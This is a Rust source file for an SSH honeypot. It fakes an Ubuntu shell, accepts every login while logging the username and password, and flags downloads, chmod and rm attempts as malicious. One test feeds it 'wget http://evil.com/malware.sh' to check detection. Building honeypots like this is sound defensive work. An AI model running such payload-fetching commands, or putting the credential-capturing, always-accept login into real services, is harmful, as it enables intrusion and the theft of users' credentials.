//! SSH Interaction Handler
//!
//! Erweiterte SSH Honeypot-Interaktionen mit Shell-Simulation

use super::command_parser::{CommandParser, Command};
use super::fake_filesystem::FakeFilesystem;
use std::time::Duration;
use tokio::time::sleep;

/// SSH Interaction Handler
pub struct SshInteractionHandler {
    filesystem: FakeFilesystem,
    command_parser: CommandParser,
    session_id: String,
    username: String,
    hostname: String,
}

impl SshInteractionHandler {
    pub fn new(session_id: String) -> Self {
        Self {
            filesystem: FakeFilesystem::new(),
            command_parser: CommandParser::new(),
            session_id,
            username: "admin".to_string(),
            hostname: "ubuntu-server".to_string(),
        }
    }

    /// Send SSH banner
    pub async fn send_banner(&self) -> String {
        sleep(Duration::from_millis(200)).await;
        "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5".to_string()
    }

    /// Authenticate (always "succeeds" for honeypot)
    pub async fn authenticate(&self, username: &str, password: &str) -> bool {
        tracing::info!(
            "🔑 SSH Auth attempt - User: {}, Pass: {}, Session: {}",
            username,
            password,
            self.session_id
        );
        
        // Simulate auth delay
        sleep(Duration::from_secs(2)).await;
        
        // Log credentials
        tracing::warn!("📝 Captured credentials: {}:{}", username, password);
        
        true // Always accept for honeypot
    }

    /// Get shell prompt
    pub fn get_prompt(&self) -> String {
        let pwd = self.filesystem.current_dir();
        format!("{}@{}:{}$ ", self.username, self.hostname, pwd)
    }

    /// Execute command and return output
    pub async fn execute_command(&mut self, input: &str) -> String {
        let cmd = self.command_parser.parse(input);
        
        if cmd.is_malicious {
            tracing::warn!("🚨 Malicious command detected: {}", cmd.raw);
        }

        tracing::info!("💻 Executing: {} (Session: {})", cmd.raw, self.session_id);

        // Simulate command execution delay
        sleep(Duration::from_millis(100)).await;

        // Handle commands
        match cmd.name.as_str() {
            "ls" => self.handle_ls(&cmd).await,
            "pwd" => self.handle_pwd().await,
            "cd" => self.handle_cd(&cmd).await,
            "cat" => self.handle_cat(&cmd).await,
            "whoami" => self.handle_whoami().await,
            "uname" => self.handle_uname(&cmd).await,
            "id" => self.handle_id().await,
            "hostname" => self.handle_hostname().await,
            "ifconfig" | "ip" => self.handle_network().await,
            "ps" => self.handle_ps().await,
            "wget" | "curl" => self.handle_download(&cmd).await,
            "chmod" | "chown" => self.handle_permission_change(&cmd).await,
            "rm" => self.handle_rm(&cmd).await,
            "echo" => self.handle_echo(&cmd).await,
            "history" => self.handle_history().await,
            "exit" | "logout" => "logout\n".to_string(),
            "" => String::new(),
            _ => format!("{}: command not found\n", cmd.name),
        }
    }

    async fn handle_ls(&self, cmd: &Command) -> String {
        let path = cmd.args.first().map(|s| s.as_str());
        
        match self.filesystem.list_dir(path) {
            Ok(entries) => {
                let mut output = String::new();
                for entry in entries {
                    if cmd.args.contains(&"-l".to_string()) || cmd.args.contains(&"-la".to_string()) {
                        output.push_str(&format!(
                            "{} 1 admin admin {:>8} Dec  1 10:00 {}\n",
                            entry.permissions, entry.size, entry.name
                        ));
                    } else {
                        output.push_str(&format!("{}  ", entry.name));
                    }
                }
                if !cmd.args.contains(&"-l".to_string()) {
                    output.push('\n');
                }
                output
            }
            Err(e) => format!("{}\n", e),
        }
    }

    async fn handle_pwd(&self) -> String {
        format!("{}\n", self.filesystem.current_dir())
    }

    async fn handle_cd(&mut self, cmd: &Command) -> String {
        if let Some(path) = cmd.args.first() {
            match self.filesystem.change_dir(path) {
                Ok(_) => String::new(),
                Err(e) => format!("{}\n", e),
            }
        } else {
            self.filesystem.change_dir("/home/admin").ok();
            String::new()
        }
    }

    async fn handle_cat(&self, cmd: &Command) -> String {
        if let Some(path) = cmd.args.first() {
            match self.filesystem.read_file(path) {
                Ok(content) => content,
                Err(e) => format!("{}\n", e),
            }
        } else {
            "cat: missing file operand\n".to_string()
        }
    }

    async fn handle_whoami(&self) -> String {
        format!("{}\n", self.username)
    }

    async fn handle_uname(&self, cmd: &Command) -> String {
        if cmd.args.contains(&"-a".to_string()) {
            "Linux ubuntu-server 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n".to_string()
        } else {
            "Linux\n".to_string()
        }
    }

    async fn handle_id(&self) -> String {
        "uid=1000(admin) gid=1000(admin) groups=1000(admin),4(adm),24(cdrom),27(sudo)\n".to_string()
    }

    async fn handle_hostname(&self) -> String {
        format!("{}\n", self.hostname)
    }

    async fn handle_network(&self) -> String {
        "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>\n".to_string()
    }

    async fn handle_ps(&self) -> String {
        "  PID TTY          TIME CMD\n 1234 pts/0    00:00:00 bash\n 5678 pts/0    00:00:00 ps\n".to_string()
    }

    async fn handle_download(&self, cmd: &Command) -> String {
        tracing::warn!("🚨 Download attempt: {}", cmd.raw);
        sleep(Duration::from_secs(1)).await;
        format!("{}: Connecting to remote server...\nConnection timed out\n", cmd.name)
    }

    async fn handle_permission_change(&self, cmd: &Command) -> String {
        tracing::warn!("🚨 Permission change attempt: {}", cmd.raw);
        format!("{}: Operation not permitted\n", cmd.name)
    }

    async fn handle_rm(&self, cmd: &Command) -> String {
        tracing::warn!("🚨 File deletion attempt: {}", cmd.raw);
        if cmd.args.contains(&"-rf".to_string()) || cmd.args.contains(&"-fr".to_string()) {
            sleep(Duration::from_millis(500)).await;
            "rm: cannot remove: Operation not permitted\n".to_string()
        } else {
            "rm: cannot remove: Operation not permitted\n".to_string()
        }
    }

    async fn handle_echo(&self, cmd: &Command) -> String {
        format!("{}\n", cmd.args.join(" "))
    }

    async fn handle_history(&self) -> String {
        let mut output = String::new();
        for (i, cmd) in self.command_parser.history().iter().enumerate() {
            output.push_str(&format!("  {}  {}\n", i + 1, cmd.raw));
        }
        output
    }

    /// Get interaction statistics
    pub fn get_stats(&self) -> String {
        let stats = self.command_parser.get_stats();
        format!(
            "Session Statistics:\n\
             Total Commands: {}\n\
             Malicious Commands: {}\n\
             Unique Commands: {}\n\
             Most Common: {:?}\n",
            stats.total_commands,
            stats.malicious_commands,
            stats.unique_commands,
            stats.most_common
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_ssh_handler_creation() {
        let handler = SshInteractionHandler::new("test-session".to_string());
        assert_eq!(handler.username, "admin");
    }

    #[tokio::test]
    async fn test_execute_whoami() {
        let mut handler = SshInteractionHandler::new("test".to_string());
        let output = handler.execute_command("whoami").await;
        assert!(output.contains("admin"));
    }

    #[tokio::test]
    async fn test_execute_pwd() {
        let mut handler = SshInteractionHandler::new("test".to_string());
        let output = handler.execute_command("pwd").await;
        assert!(output.contains("/home/admin"));
    }

    #[tokio::test]
    async fn test_malicious_command_detection() {
        let mut handler = SshInteractionHandler::new("test".to_string());
        let _output = handler.execute_command("wget http://evil.com/malware.sh").await;
        let stats = handler.command_parser.get_stats();
        assert!(stats.malicious_commands > 0);
    }
}
